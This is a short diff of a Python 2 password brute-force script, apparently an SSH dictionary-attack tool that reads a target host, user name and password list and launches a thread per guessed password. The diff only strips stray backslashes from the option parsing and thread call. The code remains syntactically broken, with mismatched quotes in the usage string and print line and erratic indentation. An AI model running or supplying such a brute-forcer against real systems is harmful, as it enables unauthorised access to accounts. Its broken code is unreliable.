@@ -25,10 +25,10 @@ def connect (host,user,password,release):
     finally:
       if release:connection_lock.release()
   def main():
-    parser = optparse.OptionParser('usuage%prog' +\ '-H <target host>' -u <user> -F <password list>')
-    parser.add_option('-H',dest ='tgtHost', type='string', \help ='specify target host')
-    parser.add_option('-F',dest = 'passwdFile', type='string',\help = 'specify password file')
-    parser.add_option('-u', dest = 'user', type = 'string', \help = 'specify the user')
+    parser = optparse.OptionParser('usuage%prog' + '-H <target host>' -u <user> -F <password list>')
+    parser.add_option('-H',dest ='tgtHost', type='string', help ='specify target host')
+    parser.add_option('-F',dest = 'passwdFile', type='string',help = 'specify password file')
+    parser.add_option('-u', dest = 'user', type = 'string', help = 'specify the user')
     (options,args) = parser.parse_args()
     host = options.tgtHost
     passwdFile = options.passwdFile
@@ -47,7 +47,7 @@ def connect (host,user,password,release):
     connection_lock.acquire()
        password = line.strip('\r').strip('\n')
     print "[-] Testing:" "+str(password)
-       t = Thread(target=connect, args=(host,user,\password,True))
+       t = Thread(target=connect, args=(host,user,password,True))
        child = t.start()
     if __name__=='__main__':
        main()
